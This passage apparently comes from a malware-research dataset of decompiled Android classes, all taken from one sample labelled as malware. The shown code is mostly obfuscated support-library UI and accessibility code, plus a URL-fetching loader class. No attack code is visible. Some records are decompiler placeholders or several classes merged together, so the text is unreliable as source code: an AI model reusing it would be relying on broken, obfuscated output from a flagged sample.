ViewPager.this.g.a()) {       aVar.a(8192);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\C0003a.code","static class C0003a extends d {   C0003a(){   }   @Override public Object a(){     return android.support.v4.view.b.a();   }   @Override public Object a(  final a aVar){     return android.support.v4.view.b.a(new b.a(){       @Override public boolean a(      View view,      AccessibilityEvent accessibilityEvent){         return aVar.b(view,accessibilityEvent);       }       @Override public void b(      View view,      AccessibilityEvent accessibilityEvent){         aVar.d(view,accessibilityEvent);       }       @Override public void a(      View view,      Object obj){         aVar.a(view,new android.support.v4.view.a.a(obj));       }       @Override public void c(      View view,      AccessibilityEvent accessibilityEvent){         aVar.c(view,accessibilityEvent);       }       @Override public boolean a(      ViewGroup viewGroup,      View view,      AccessibilityEvent accessibilityEvent){         return aVar.a(viewGroup,view,accessibilityEvent);       }       @Override public void a(      View view,      int i){         aVar.a(view,i);       }       @Override public void d(      View view,      AccessibilityEvent accessibilityEvent){         aVar.a(view,accessibilityEvent);       }     } );   }   @Override public boolean a(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     return android.support.v4.view.b.a(obj,view,accessibilityEvent);   }   @Override public void b(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     android.support.v4.view.b.b(obj,view,accessibilityEvent);   }   @Override public void a(  Object obj,  View view,  android.support.v4.view.a.a aVar){     android.support.v4.view.b.a(obj,view,aVar.a());   }   @Override public void c(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     android.support.v4.view.b.c(obj,view,accessibilityEvent);   }   @Override public boolean a(  Object obj,  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent){     return android.support.v4.view.b.a(obj,viewGroup,view,accessibilityEvent);   }   @Override public void a(  Object obj,  View view,  int i){     android.support.v4.view.b.a(obj,view,i);   }   @Override public void d(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     android.support.v4.view.b.d(obj,view,accessibilityEvent);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\d.code","static class d implements b {   d(){   }   @Override public Object a(){     return null;   }   @Override public Object a(  a aVar){     return null;   }   @Override public boolean a(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){     return false;   }   @Override public void b(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){   }   @Override public void a(  Object obj,  View view,  android.support.v4.view.a.a aVar){   }   @Override public void c(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){   }   @Override public boolean a(  Object obj,  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent){     return true;   }   @Override public void a(  Object obj,  View view,  int i){   }   @Override public void d(  Object obj,  View view,  AccessibilityEvent accessibilityEvent){   } } public class d {   static final c a; interface c {     boolean a(    int i,    int i2);     boolean b(    int i);   } static class a implements c {     private static final int META_ALL_MASK=247;     private static final int META_MODIFIER_MASK=247;     a(){     }     private static int a(    int i,    int i2,    int i3,    int i4,    int i5){       boolean z=(i2 & i3) != 0;       int i6=i4 | i5;       boolean z2=(i2 & i6) != 0;       if (z) {         if (z2) {           throw new IllegalArgumentException(""bad arguments"");         }         return i & (i6 ^ (-1));       }       if (z2) {         return i & (i3 ^ (-1));       }       return i;     }     public int a(    int i){       int i2=(i & 192) != 0 ? i | 1 : i;       if ((i2 & 48) != 0) {         i2|=2;       }       return i2 & 247;     }     @Override public boolean a(    int i,    int i2){       return a(a(a(i) & 247,i2,1,64,android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS),i2,2,16,32) == i2;     }     @Override public boolean b(    int i){       return (a(i) & 247) == 0;     }   } static class b implements c {     b(){     }     @Override public boolean a(    int i,    int i2){       return e.a(i,i2);     }     @Override public boolean b(    int i){       return e.a(i);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       a=new b();     }  else {       a=new a();     }   }   public static boolean a(  KeyEvent keyEvent,  int i){     return a.a(keyEvent.getMetaState(),i);   }   public static boolean a(  KeyEvent keyEvent){     return a.b(keyEvent.getMetaState());   } } static class d extends c {   d(){   }   @Override public boolean a(  View view,  int i){     return o.a(view,i);   }   @Override public void a(  View view,  android.support.v4.view.a aVar){     o.a(view,aVar.a());   } } static class d implements b {   d(){   }   @Override public void a(  TextView textView){     i.a(textView);   } } interface d {   void a(  h hVar,  h hVar2); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\e.code","class e {   public static boolean a(  int i,  int i2){     return KeyEvent.metaStateHasModifiers(i,i2);   }   public static boolean a(  int i){     return KeyEvent.metaStateHasNoModifiers(i);   } } static class e extends d {   e(){   }   @Override public void b(  View view){     p.a(view);   }   @Override public int c(  View view){     return p.b(view);   }   @Override public void b(  View view,  int i){     p.a(view,i);   } } public interface e {   void a(  int i);   void a(  int i,  float f,  int i2);   void b(  int i); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\f.code","public class f {   public static final int ACTION_HOVER_ENTER=9;   public static final int ACTION_HOVER_EXIT=10;   public static final int ACTION_HOVER_MOVE=7;   public static final int ACTION_MASK=255;   public static final int ACTION_POINTER_DOWN=5;   public static final int ACTION_POINTER_INDEX_MASK=65280;   public static final int ACTION_POINTER_INDEX_SHIFT=8;   public static final int ACTION_POINTER_UP=6;   public static final int ACTION_SCROLL=8;   static final c a; interface c {     int a(    MotionEvent motionEvent,    int i);     int b(    MotionEvent motionEvent,    int i);     float c(    MotionEvent motionEvent,    int i);     float d(    MotionEvent motionEvent,    int i);   } static class a implements c {     a(){     }     @Override public int a(    MotionEvent motionEvent,    int i){       return i == 0 ? 0 : -1;     }     @Override public int b(    MotionEvent motionEvent,    int i){       if (i == 0) {         return 0;       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public float c(    MotionEvent motionEvent,    int i){       if (i == 0) {         return motionEvent.getX();       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public float d(    MotionEvent motionEvent,    int i){       if (i == 0) {         return motionEvent.getY();       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }   } static class b implements c {     b(){     }     @Override public int a(    MotionEvent motionEvent,    int i){       return g.a(motionEvent,i);     }     @Override public int b(    MotionEvent motionEvent,    int i){       return g.b(motionEvent,i);     }     @Override public float c(    MotionEvent motionEvent,    int i){       return g.c(motionEvent,i);     }     @Override public float d(    MotionEvent motionEvent,    int i){       return g.d(motionEvent,i);     }   } static {     if (Build.VERSION.SDK_INT >= 5) {       a=new b();     }  else {       a=new a();     }   }   public static int a(  MotionEvent motionEvent){     return (motionEvent.getAction() & ACTION_POINTER_INDEX_MASK) >> 8;   }   public static int a(  MotionEvent motionEvent,  int i){     return a.a(motionEvent,i);   }   public static int b(  MotionEvent motionEvent,  int i){     return a.b(motionEvent,i);   }   public static float c(  MotionEvent motionEvent,  int i){     return a.c(motionEvent,i);   }   public static float d(  MotionEvent motionEvent,  int i){     return a.d(motionEvent,i);   } } interface f {   int a(  View view);   void a(  View view,  android.support.v4.view.a aVar);   boolean a(  View view,  int i);   void b(  View view);   void b(  View view,  int i);   int c(  View view); } private class f extends DataSetObserver {   private f(){   }   @Override public void onChanged(){     ViewPager.this.b();   }   @Override public void onInvalidated(){     ViewPager.this.b();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\g.code","class g {   public static int a(  MotionEvent motionEvent,  int i){     return motionEvent.findPointerIndex(i);   }   public static int b(  MotionEvent motionEvent,  int i){     return motionEvent.getPointerId(i);   }   public static float c(  MotionEvent motionEvent,  int i){     return motionEvent.getX(i);   }   public static float d(  MotionEvent motionEvent,  int i){     return motionEvent.getY(i);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\h.code","public abstract class h {   public static final int POSITION_NONE=-2;   public static final int POSITION_UNCHANGED=-1;   private DataSetObservable a;   public abstract int a();   public abstract boolean a(  View view,  Object obj);   public void a(  ViewGroup viewGroup){     a((View)viewGroup);   }   public Object a(  ViewGroup viewGroup,  int i){     return a((View)viewGroup,i);   }   public void a(  ViewGroup viewGroup,  int i,  Object obj){     a((View)viewGroup,i,obj);   }   public void b(  ViewGroup viewGroup,  int i,  Object obj){     b((View)viewGroup,i,obj);   }   public void b(  ViewGroup viewGroup){     b((View)viewGroup);   }   public void a(  View view){   }   public Object a(  View view,  int i){     throw new UnsupportedOperationException(""Required method instantiateItem was not overridden"");   }   public void a(  View view,  int i,  Object obj){     throw new UnsupportedOperationException(""Required method destroyItem was not overridden"");   }   public void b(  View view,  int i,  Object obj){   }   public void b(  View view){   }   public Parcelable b(){     return null;   }   public void a(  Parcelable parcelable,  ClassLoader classLoader){   }   public int a(  Object obj){     return -1;   }   public void a(  DataSetObserver dataSetObserver){     this.a.registerObserver(dataSetObserver);   }   public void b(  DataSetObserver dataSetObserver){     this.a.unregisterObserver(dataSetObserver);   }   public CharSequence a(  int i){     return null;   }   public float b(  int i){     return 1.0f;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\i.code","class i {   public static void a(  TextView textView){     textView.setTransformationMethod(new a(textView.getContext()));   } private static class a extends SingleLineTransformationMethod {     private static final String TAG=""SingleLineAllCapsTransform"";     private Locale a;     public a(    Context context){       this.a=context.getResources().getConfiguration().locale;     }     @Override public CharSequence getTransformation(    CharSequence charSequence,    View view){       CharSequence transformation=super.getTransformation(charSequence,view);       if (transformation != null) {         return transformation.toString().toUpperCase(this.a);       }       return null;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\j.code","public class j {   static final c a; interface c {     float a(    VelocityTracker velocityTracker,    int i);   } static class a implements c {     a(){     }     @Override public float a(    VelocityTracker velocityTracker,    int i){       return velocityTracker.getXVelocity();     }   } static class b implements c {     b(){     }     @Override public float a(    VelocityTracker velocityTracker,    int i){       return k.a(velocityTracker,i);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       a=new b();     }  else {       a=new a();     }   }   public static float a(  VelocityTracker velocityTracker,  int i){     return a.a(velocityTracker,i);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\k.code","class k {   public static float a(  VelocityTracker velocityTracker,  int i){     return velocityTracker.getXVelocity(i);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\l.code","public class l {   private static final long FAKE_FRAME_TIME=10;   public static final int IMPORTANT_FOR_ACCESSIBILITY_AUTO=0;   public static final int IMPORTANT_FOR_ACCESSIBILITY_NO=2;   public static final int IMPORTANT_FOR_ACCESSIBILITY_YES=1;   public static final int OVER_SCROLL_ALWAYS=0;   public static final int OVER_SCROLL_IF_CONTENT_SCROLLS=1;   public static final int OVER_SCROLL_NEVER=2;   static final f a; interface f {     int a(    View view);     void a(    View view,    android.support.v4.view.a aVar);     boolean a(    View view,    int i);     void b(    View view);     void b(    View view,    int i);     int c(    View view);   } static class a implements f {     a(){     }     @Override public boolean a(    View view,    int i){       return false;     }     @Override public int a(    View view){       return 2;     }     @Override public void a(    View view,    android.support.v4.view.a aVar){     }     @Override public void b(    View view){       view.postInvalidateDelayed(a());     }     long a(){       return l.FAKE_FRAME_TIME;     }     @Override public int c(    View view){       return 0;     }     @Override public void b(    View view,    int i){     }   } static class b extends a {     b(){     }     @Override public int a(    View view){       return m.a(view);     }   } static class c extends b {     c(){     }     @Override long a(){       return n.a();     }   } static class d extends c {     d(){     }     @Override public boolean a(    View view,    int i){       return o.a(view,i);     }     @Override public void a(    View view,    android.support.v4.view.a aVar){       o.a(view,aVar.a());     }   } static class e extends d {     e(){     }     @Override public void b(    View view){       p.a(view);     }     @Override public int c(    View view){       return p.b(view);     }     @Override public void b(    View view,    int i){       p.a(view,i);     }   } static {     int i=Build.VERSION.SDK_INT;     if (i >= 16 || Build.VERSION.CODENAME.equals(""JellyBean"")) {       a=new e();       return;     }     if (i >= 14) {       a=new d();       return;     }     if (i >= 11) {       a=new c();     }  else     if (i >= 9) {       a=new b();     }  else {       a=new a();     }   }   public static boolean a(  View view,  int i){     return a.a(view,i);   }   public static int a(  View view){     return a.a(view);   }   public static void a(  View view,  android.support.v4.view.a aVar){     a.a(view,aVar);   }   public static void b(  View view){     a.b(view);   }   public static int c(  View view){     return a.c(view);   }   public static void b(  View view,  int i){     a.b(view,i);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\LayoutParams.code","public static class LayoutParams extends ViewGroup.LayoutParams {   public boolean a;   public int b;   public float c;   public boolean d;   public LayoutParams(){     super(-1,-1);     this.c=0.0f;   }   public LayoutParams(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.c=0.0f;     TypedArray obtainStyledAttributes=context.obtainStyledAttributes(attributeSet,ViewPager.a);     this.b=obtainStyledAttributes.getInteger(0,48);     obtainStyledAttributes.recycle();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\m.code","class m {   public static int a(  View view){     return view.getOverScrollMode();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\n.code","class n {   public static long a(){     return ValueAnimator.getFrameDelay();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\o.code","class o {   public static boolean a(  View view,  int i){     return view.canScrollHorizontally(i);   }   public static void a(  View view,  Object obj){     view.setAccessibilityDelegate((View.AccessibilityDelegate)obj);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\p.code","public class p {   public static void a(  View view){     view.postInvalidateOnAnimation();   }   public static int b(  View view){     return view.getImportantForAccessibility();   }   public static void a(  View view,  int i){     view.setImportantForAccessibility(i);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\PagerTabStrip.code","public class PagerTabStrip extends PagerTitleStrip {   private static final int FULL_UNDERLINE_HEIGHT=1;   private static final int INDICATOR_HEIGHT=3;   private static final int MIN_PADDING_BOTTOM=6;   private static final int MIN_STRIP_HEIGHT=32;   private static final int MIN_TEXT_SPACING=64;   private static final int TAB_PADDING=16;   private static final int TAB_SPACING=32;   private static final String TAG=""PagerTabStrip"";   private int f;   private int g;   private int h;   private int i;   private int j;   private int k;   private final Paint l;   private final Rect m;   private int n;   private boolean o;   private boolean p;   private int q;   private boolean r;   private float s;   private float t;   private int u;   public PagerTabStrip(  Context context){     this(context,null);   }   public PagerTabStrip(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.l=new Paint();     this.m=new Rect();     this.n=255;     this.o=false;     this.p=false;     this.f=this.e;     this.l.setColor(this.f);     float f=context.getResources().getDisplayMetrics().density;     this.g=(int)((3.0f * f) + 0.5f);     this.h=(int)((6.0f * f) + 0.5f);     this.i=(int)(64.0f * f);     this.k=(int)((16.0f * f) + 0.5f);     this.q=(int)((1.0f * f) + 0.5f);     this.j=(int)((f * 32.0f) + 0.5f);     this.u=ViewConfiguration.get(context).getScaledTouchSlop();     setPadding(getPaddingLeft(),getPaddingTop(),getPaddingRight(),getPaddingBottom());     setTextSpacing(getTextSpacing());     setWillNotDraw(false);     this.b.setFocusable(true);     this.b.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view){         PagerTabStrip.this.a.setCurrentItem(PagerTabStrip.this.a.getCurrentItem() - 1);       }     } );     this.d.setFocusable(true);     this.d.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view){         PagerTabStrip.this.a.setCurrentItem(PagerTabStrip.this.a.getCurrentItem() + 1);       }     } );     if (getBackground() == null) {       this.o=true;     }   }   public void setTabIndicatorColor(  int i){     this.f=i;     this.l.setColor(this.f);     invalidate();   }   public void setTabIndicatorColorResource(  int i){     setTabIndicatorColor(getContext().getResources().getColor(i));   }   public int getTabIndicatorColor(){     return this.f;   }   @Override public void setPadding(  int i,  int i2,  int i3,  int i4){     if (i4 < this.h) {       i4=this.h;     }     super.setPadding(i,i2,i3,i4);   }   @Override public void setTextSpacing(  int i){     if (i < this.i) {       i=this.i;     }     super.setTextSpacing(i);   }   @Override public void setBackgroundDrawable(  Drawable drawable){     super.setBackgroundDrawable(drawable);     if (!this.p) {       this.o=drawable == null;     }   }   @Override public void setBackgroundColor(  int i){     super.setBackgroundColor(i);     if (!this.p) {       this.o=((-16777216) & i) == 0;     }   }   @Override public void setBackgroundResource(  int i){     super.setBackgroundResource(i);     if (!this.p) {       this.o=i == 0;     }   }   public void setDrawFullUnderline(  boolean z){     this.o=z;     this.p=true;     invalidate();   }   public boolean getDrawFullUnderline(){     return this.o;   }   @Override public int getMinHeight(){     return Math.max(super.getMinHeight(),this.j);   }   @Override public boolean onTouchEvent(  MotionEvent motionEvent){     int action=motionEvent.getAction();     if (action != 0 && this.r) {       return false;     }     float x=motionEvent.getX();     float y=motionEvent.getY(); switch (action) { case 0:       this.s=x;     this.t=y;   this.r=false; break; case 1: if (x >= this.c.getLeft() - this.k) { if (x > this.c.getRight() + this.k) {   this.a.setCurrentItem(this.a.getCurrentItem() + 1);   break; } }  else { this.a.setCurrentItem(this.a.getCurrentItem() - 1); break; } break; case 2: if (Math.abs(x - this.s) > this.u || Math.abs(y - this.t) > this.u) { this.r=true; break; } break; } return true; } @Override protected void onDraw(Canvas canvas){ super.onDraw(canvas); int height=getHeight(); int left=this.c.getLeft() - this.k; int right=this.c.getRight() + this.k; int i=height - this.g; this.l.setColor((this.n << 24) | (this.f & 16777215)); canvas.drawRect(left,i,right,height,this.l); if (this.o) { this.l.setColor((-16777216) | (this.f & 16777215)); canvas.drawRect(0.0f,height - this.q,getWidth(),height,this.l); } } @Override public void a(int i,float f,boolean z){ Rect rect=this.m; int height=getHeight(); int left=this.c.getLeft() - this.k; int right=this.c.getRight() + this.k; int i2=height - this.g; rect.set(left,i2,right,height); super.a(i,f,z); this.n=(int)(Math.abs(f - 0.5f) * 2.0f * 255.0f); rect.union(this.c.getLeft() - this.k,i2,this.c.getRight() + this.k,height); invalidate(rect); } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\PagerTitleStrip.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4ce2f4d6"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\q.code","public class q {   static final c a; interface c {     int a(    ViewConfiguration viewConfiguration);   } static class a implements c {     a(){     }     @Override public int a(    ViewConfiguration viewConfiguration){       return viewConfiguration.getScaledTouchSlop();     }   } static class b implements c {     b(){     }     @Override public int a(    ViewConfiguration viewConfiguration){       return r.a(viewConfiguration);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       a=new b();     }  else {       a=new a();     }   }   public static int a(  ViewConfiguration viewConfiguration){     return a.a(viewConfiguration);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\r.code","class r {   public static int a(  ViewConfiguration viewConfiguration){     return viewConfiguration.getScaledPagingTouchSlop();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\SavedState.code","public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=android.support.v4.b.a.a(new android.support.v4.b.b<SavedState>(){     @Override public SavedState a(    Parcel parcel,    ClassLoader classLoader){       return new SavedState(parcel,classLoader);     }     @Override public SavedState[] a(    int i){       return new SavedState[i];     }   } );   int a;   Parcelable b;   ClassLoader c;   public SavedState(  Parcelable parcelable){     super(parcelable);   }   @Override public void writeToParcel(  Parcel parcel,  int i){     super.writeToParcel(parcel,i);     parcel.writeInt(this.a);     parcel.writeParcelable(this.b,i);   }   public String toString(){     return ""FragmentPager.SavedState{"" + Integer.toHexString(System.identityHashCode(this)) + "" position=""+ this.a+ ""}"";   }   SavedState(  Parcel parcel,  ClassLoader classLoader){     super(parcel);     classLoader=classLoader == null ? getClass().getClassLoader() : classLoader;     this.a=parcel.readInt();     this.b=parcel.readParcelable(classLoader);     this.c=classLoader;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view\ViewPager.code","!org.eclipse.jdt.core.dom.TypeDeclaration@65ec6337"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view.a\a.code","public class a {   public static final int ACTION_ACCESSIBILITY_FOCUS=64;   public static final String ACTION_ARGUMENT_HTML_ELEMENT_STRING=""ACTION_ARGUMENT_HTML_ELEMENT_STRING"";   public static final String ACTION_ARGUMENT_MOVEMENT_GRANULARITY_INT=""ACTION_ARGUMENT_MOVEMENT_GRANULARITY_INT"";   public static final int ACTION_CLEAR_ACCESSIBILITY_FOCUS=128;   public static final int ACTION_CLEAR_FOCUS=2;   public static final int ACTION_CLEAR_SELECTION=8;   public static final int ACTION_CLICK=16;   public static final int ACTION_FOCUS=1;   public static final int ACTION_LONG_CLICK=32;   public static final int ACTION_NEXT_AT_MOVEMENT_GRANULARITY=256;   public static final int ACTION_NEXT_HTML_ELEMENT=1024;   public static final int ACTION_PREVIOUS_AT_MOVEMENT_GRANULARITY=512;   public static final int ACTION_PREVIOUS_HTML_ELEMENT=2048;   public static final int ACTION_SCROLL_BACKWARD=8192;   public static final int ACTION_SCROLL_FORWARD=4096;   public static final int ACTION_SELECT=4;   public static final int FOCUS_ACCESSIBILITY=2;   public static final int FOCUS_INPUT=1;   public static final int MOVEMENT_GRANULARITY_CHARACTER=1;   public static final int MOVEMENT_GRANULARITY_LINE=4;   public static final int MOVEMENT_GRANULARITY_PAGE=16;   public static final int MOVEMENT_GRANULARITY_PARAGRAPH=8;   public static final int MOVEMENT_GRANULARITY_WORD=2;   private static final b a;   private final Object b; interface b {     void a(    Object obj,    int i);     void a(    Object obj,    CharSequence charSequence);     void a(    Object obj,    boolean z);   } static class d implements b {     d(){     }     @Override public void a(    Object obj,    int i){     }     @Override public void a(    Object obj,    CharSequence charSequence){     }     @Override public void a(    Object obj,    boolean z){     }   } static class C0004a extends d {     C0004a(){     }     @Override public void a(    Object obj,    int i){       android.support.v4.view.a.b.a(obj,i);     }     @Override public void a(    Object obj,    CharSequence charSequence){       android.support.v4.view.a.b.a(obj,charSequence);     }     @Override public void a(    Object obj,    boolean z){       android.support.v4.view.a.b.a(obj,z);     }   } static class c extends C0004a {     c(){     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       a=new c();     }  else     if (Build.VERSION.SDK_INT >= 14) {       a=new C0004a();     }  else {       a=new d();     }   }   public a(  Object obj){     this.b=obj;   }   public Object a(){     return this.b;   }   public void a(  int i){     a.a(this.b,i);   }   public void a(  boolean z){     a.a(this.b,z);   }   public void a(  CharSequence charSequence){     a.a(this.b,charSequence);   }   public int hashCode(){     if (this.b == null) {       return 0;     }     return this.b.hashCode();   }   public boolean equals(  Object obj){     if (this == obj) {       return true;     }     if (obj != null && getClass() == obj.getClass()) {       a aVar=(a)obj;       return this.b == null ? aVar.b == null : this.b.equals(aVar.b);     }     return false;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view.a\b.code","interface b {   void a(  Object obj,  int i);   void a(  Object obj,  CharSequence charSequence);   void a(  Object obj,  boolean z); } class b {   public static void a(  Object obj,  int i){     ((AccessibilityNodeInfo)obj).addAction(i);   }   public static void a(  Object obj,  CharSequence charSequence){     ((AccessibilityNodeInfo)obj).setClassName(charSequence);   }   public static void a(  Object obj,  boolean z){     ((AccessibilityNodeInfo)obj).setScrollable(z);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view.a\c.code","static class c extends C0004a {   c(){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view.a\C0004a.code","static class C0004a extends d {   C0004a(){   }   @Override public void a(  Object obj,  int i){     android.support.v4.view.a.b.a(obj,i);   }   @Override public void a(  Object obj,  CharSequence charSequence){     android.support.v4.view.a.b.a(obj,charSequence);   }   @Override public void a(  Object obj,  boolean z){     android.support.v4.view.a.b.a(obj,z);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\android.support.v4.view.a\d.code","static class d implements b {   d(){   }   @Override public void a(  Object obj,  int i){   }   @Override public void a(  Object obj,  CharSequence charSequence){   }   @Override public void a(  Object obj,  boolean z){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\a.code","public class a {   private static a a=null;   private final AtomicInteger b=new AtomicInteger(1);   public static synchronized a a(){     a aVar; synchronized (a.class) {       if (a == null) {         if (Build.VERSION.SDK_INT >= 17) {           a=new o();         }  else         if (Build.VERSION.SDK_INT >= 16) {           a=new n();         }  else         if (Build.VERSION.SDK_INT >= 13) {           a=new m();         }  else         if (Build.VERSION.SDK_INT >= 11) {           a=new l();         }  else         if (Build.VERSION.SDK_INT >= 9) {           a=new p();         }  else {           a=new a();         }       }       aVar=a;     }     return aVar;   }   public long a(  PackageInfo packageInfo){     return 0L;   }   public long a(  PackageInfo packageInfo,  ApplicationInfo applicationInfo){     try {       return new File(applicationInfo.publicSourceDir).lastModified();     }  catch (    Throwable th) {       return 0L;     }   }   public Point a(  Context context){     WindowManager windowManager=(WindowManager)context.getSystemService(""window"");     Display defaultDisplay=windowManager == null ? null : windowManager.getDefaultDisplay();     Point point=new Point();     if (defaultDisplay != null) {       point.x=defaultDisplay.getWidth();       point.y=defaultDisplay.getHeight();     }     return point;   }   public void a(  Activity activity){   }   public void a(  SharedPreferences.Editor editor){     editor.commit();   }   public void a(  View view){   }   public void a(  View view,  Drawable drawable){     view.setBackgroundDrawable(drawable);   }   public void b(  SharedPreferences.Editor editor){     new Thread(new k(this,editor)).start();   } } public static class a {   private final List a=new ArrayList();   public a(  List list){     this.a.addAll(list);   }   static a a(  a aVar){     a aVar2=new a(aVar.a);     Collections.shuffle(aVar2.a);     return aVar2;   } } public static class a {   final f a;   final Object[] b;   a(  f fVar,  Object... objArr){     this.a=fVar;     this.b=objArr;   } } public static final class a extends f {   private final y d;   private final String e;   public a(  y yVar,  String str){     this.d=yVar;     this.e=str;   }   @Override public b a(){     byte[] bArr;     byte[] bArr2;     ac acVar=this.d.a;     HttpGet httpGet=new HttpGet(this.e);     if (acVar != null) {       try {         Exchanger exchanger=new Exchanger();         acVar.a((Object)this.e,(aa)new z(this,exchanger));         bArr=(byte[])exchanger.exchange(null);       }  catch (      Throwable th) {         return new b(null,th);       }     }  else {       bArr=null;     }     if (bArr == null) {       HttpResponse execute=ai.a().execute(httpGet);       try {         if (execute.getStatusLine().getStatusCode() == 404) {           return new b(null,new IOException(""Http 404""));         }         InputStream content=new BufferedHttpEntity(execute.getEntity()).getContent();         ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();         byte[] bArr3=new byte[32768];         while (content.available() > 0) {           byteArrayOutputStream.write(bArr3,0,content.read(bArr3));         }         byte[] byteArray=byteArrayOutputStream.toByteArray();         if (acVar != null && byteArrayOutputStream.size() < acVar.a() / 2) {           acVar.a(this.e,byteArray);         }         c.a(execute);         bArr2=byteArray;       }   finally {         c.a(execute);       }     }  else {       bArr2=bArr;     }     return new b(bArr2,null);   }   @Override protected final void a(  Object obj){     b bVar=(b)obj;     Map map=this.d.b; synchronized (map) {       List list=(List)map.get(this.e);       if (list != null) {         Iterator it=list.iterator();         while (it.hasNext()) {           ((aa)it.next()).a(bVar);         }       }       map.remove(this.e);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\aa.code","public interface aa {   void a(  Object obj); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\cmn\ab.code","public final class ab {   private static float a=1.0f;   public static float a(  float f){     return a * f;   }   public static void a(  Context context){     a=context.getResources().getDisplayMetrics().density;   }   public static int b(  float f){     return Math.round(a * f);   } } "
